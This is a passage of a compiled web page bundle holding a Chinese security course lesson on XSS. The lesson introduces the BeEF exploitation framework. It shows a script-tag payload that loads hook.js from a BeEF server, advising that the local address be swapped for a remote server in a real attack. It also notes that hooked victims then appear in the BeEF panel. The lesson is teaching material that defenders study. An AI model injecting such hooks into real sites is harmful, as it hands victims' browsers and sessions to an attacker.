漏洞插入目标网站的攻击脚本地址。</p>`,6),os=l('<p>图 25：返回 hook.js 和管理界面地址</p><p>我本地得到地址是：<a href="http://127.0.0.1:3000/hook.js%EF%BC%88%E5%AE%9E%E9%99%85%E6%94%BB%E5%87%BB%E6%97%B6%EF%BC%8C%E5%8F%AF%E5%B0%86" target="_blank" rel="noreferrer">http://127.0.0.1:3000/hook.js（实际攻击时，可将</a> 127.0.0.1 替换成你的远程服务器地址），那我就可以在漏洞页面插入如下代码进行利用：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;</span><span style="color:#E1E4E8;">script</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//127.0.0.1:3000/hook.js&lt;/script&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;</span><span style="color:#24292E;">script</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//127.0.0.1:3000/hook.js&lt;/script&gt;</span></span></code></pre></div><p>受害者访问后，若利用成功的话，在 BeEF 管理页面（此处为 <a href="http://127.0.0.1:3000/ui/panel%EF%BC%89%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E7%9B%AE%E6%A0%87%E4%B8%8A%E7%BA%BF%E4%BA%86%E3%80%82" target="_blank" rel="noreferrer">http://127.0.0.1:3000/ui/panel）就可以看到目标上线了。</a></p>',4),es=l('<p>图 26：BeEF 漏洞利用框架</p><p>刚运行的时候，BeEF 会生成随机密码，账号为 beef，比如：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">Beef credentials</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;"> beef</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;">aaGivbkemeYNtCYRFrlyQN75lcmMYMm5</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">Beef credentials</span><span style="color:#D73A49;">:</span><span style="color:#24292E;"> beef</span><span style="color:#D73A49;">:</span><span style="color:#24292E;">aaGivbkemeYNtCYRFrlyQN75lcmMYMm5</span></span></code></pre></div><p>用上面的账号密码登录即可；你也可以修改 config.yaml 中的账号密码再运行。</p><p>BeEF 上面的利用功能实在是太多了，你可以把每个功能都试用一下，相信你试用完之后会对 XSS 的危害和利用手法有新的认识。</p><h3 id="总结" tabindex="-1">总结 <a class="header-anchor" href="#总结" aria-label="Permalink to &quot;总结&quot;">​</a></h3><p>最后，我对这一讲的内容做个总结。</p><p>首先，我介绍了 XSS 的起源以及危害，然后讲解了反射型、存储型和 DOM 型 XSS 的原理，并从代码层面分析了漏洞成因。随后我介绍了各种常见的 XSS 攻击手法，结合实例分析了 Cookie 窃取和蠕虫攻击的具体实现，帮助你进一步了解 XSS 的危害。</p><p>BeEF 是一款优秀的 XSS 攻击框架，包含有非常丰富的 XSS 漏洞利用功能，如果你想深入学习 XSS 的攻击手段，从 BeEF 入手是不错的选择。BeEF 已经在 GitHub 开源，主要是采用 JavaScript 和 Ruby 开发，你可以重点研究下漏洞利用中的 JavaScript 代码，即 hook.js 文件。</p><p>如果你有什么好的 BeEF 利用技巧，或者是其他优秀的 XSS 利用工具，欢迎你在留言区留言推荐。</p><p>下一讲，我将介绍如何挖掘三大类型的 XSS 漏洞以及如何防御，到时见~</p>',11);function ts(cs,rs,Es,ys,is,Fs){const a=e("Image");return t(),c("div",null,[E,y,p(a,{alt:"Drawing 0.png",src:"https://s0.lgstatic.com/i/image2/M01/03/7A/Cip5yF_cObWAcn2DAAEyh5k671U380.png"}),n(),i,p(a,{alt:"图片1.png",src:"https://s0.lgstatic.com/i/image2/M01/04/3D/Cip5yF_r7ISAKpGDAAE_SLFVjcU039.png"}),n(),F,d,g,p(a,{alt:"图片2.png",src:"https://s0.lgstatic.com/i/image2/M01/04/3F/CgpVE1_r7JCAF0j6AAXp8LneUp8609.png"}),n(),u,p(a,{alt:"图片3.png",src:"https://s0.lgstatic.com/i/image2/M01/04/3D/Cip5yF_r7JyAUiNUAAYMaTTY7f0311.png"}),n(),m,p(a,{alt:"图片4.png",src:"https://s0.lgstatic.com/i/image/M00/8C/65/CgqCHl_r7LKANa2yAAEJmWv_d8A830.png"}),n(),A,C,p(a,{alt:"Drawing 5.png",src:"https://s0.lgstatic.com/i/image/M00/8B/9D/Ciqc1F_cOeGAdXqVAAAh9BFmkfc434.png"}),n(),_,p(a,{alt:"图片5.png",src:"https://s0.lgstatic.com/i/image/M00/8C/5A/Ciqc1F_r7NGAZEpfAAML5lu_1b0195.png"}),n(),h,p(a,{alt:"图片6.png",src:"https://s0.lgstatic.com/i/image/M00/8C/5B/Ciqc1F_r7U6AD8GlAADstIgZx_U342.png"}),n(),D,S,p(a,{alt:"Drawing 8.png",src:"https://s0.lgstatic.com/i/image2/M01/03/7A/Cip5yF_cOlSAfG1CAAAitat9u8o887.png"}),n(),B,k,b,v,T,q,p(a,{alt:"Drawing 9.png",src:"https://s0.lgstatic.com/i/image2/M01/03/7B/CgpVE1_cOmCAFLL8AAESjwfi8EI088.png"}),n(),f,X,p(a,{alt:"图片7.png",src:"https://s0.lgstatic.com/i/image2/M01/04/3F/CgpVE1_r7WiAQMawAAJJrNlYAtg875.png"}),n(),x,$,p(a,{alt:"图片8.png",src:"https://s0.lgstatic.com/i/image2/M01/04/3F/CgpVE1_r7XKAWt3vAAFpOE6XpHM284.png"}),n(),w,M,p(a,{alt:"Drawing 12.png",src:"https://s0.lgstatic.com/i/image/M00/8B/A8/CgqCHl_cOnqAWzPrAACfVXHEAAk486.png"}),n(),R,p(a,{alt:"Drawing 13.png",src:"https://s0.lgstatic.com/i/image/M00/8B/A8/CgqCHl_cOoiAD43UAADLY39KIOc450.png"}),n(),H,P,O,p(a,{alt:"Drawing 14.png",src:"https://s0.lgstatic.com/i/image2/M01/03/7A/Cip5yF_cOp-Acv-zAANwGCdez2k054.png"}),n(),I,p(a,{alt:"Drawing 15.png",src:"https://s0.lgstatic.com/i/image2/M01/03/7A/Cip5yF_cOpiAMrRcAACz4ZPfiHE961.png"}),n(),j,p(a,{alt:"Drawing 16.png",src:"https://s0.lgstatic.com/i/image2/M01/03/7A/Cip5yF_cOraARaEHAACAgMxORjM038.png"}),n(),V,p(a,{alt:"图片10.png",src:"https://s0.lgstatic.com/i/image2/M01/04/3F/CgpVE1_r7PeAeYKNAAKRGDzBTuE416.png"}),n(),L,p(a,{alt:"图片11.png",src:"https://s0.lgstatic.com/i/image/M00/8C/0E/CgqCHl_kTAmAQB_aAAEDK3yLJkY943.png"}),n(),N,U,p(a,{alt:"Drawing 19.png",src:"https://s0.lgstatic.com/i/image/M00/8B/9D/Ciqc1F_cOtaASyQeAAHRnEyplEU737.png"}),n(),G,J,p(a,{alt:"图片13.png",src:"https://s0.lgstatic.com/i/image2/M01/04/3F/CgpVE1_r7hmATCQBAAHhyKThdOI750.png"}),n(),W,K,Y,z,Q,Z,ss,p(a,{alt:"Drawing 21.png",src:"https://s0.lgstatic.com/i/image/M00/8B/9D/Ciqc1F_cOu-AUgG8AAMoVNqvtj8470.png"}),n(),ns,p(a,{alt:"Drawing 22.png",src:"https://s0.lgstatic.com/i/image/M00/8B/A8/CgqCHl_cOwOAbfppAATnMiQk45A089.png"}),n(),as,ps,p(a,{alt:"图片15.png",src:"https://s0.lgstatic.com/i/image2/M01/03/E6/Cip5yF_kTF-ALwT6AALUte7Tb1k341.png"}),n(),ls,p(a,{alt:"Drawing 24.png",src:"https://s0.lgstatic.com/i/image/M00/8B/A8/CgqCHl_cOyKADDkjAAC98rkZQJg985.png"}),n(),os,p(a,{alt:"Drawing 25.png",src:"https://s0.lgstatic.com/i/image/M00/8B/9D/Ciqc1F_cOymAFUlLAAJ8WDrvvw8214.png"}),n(),es,p(a,{alt:"Lark20201224-160053.png",src:"https://s0.lgstatic.com/i/image2/M01/03/E8/CgpVE1_kTHSAL9KqAAUNAGwX_GM335.png"})])}const us=o(r,[["render",ts]]);export{gs as __pageData,us as default};
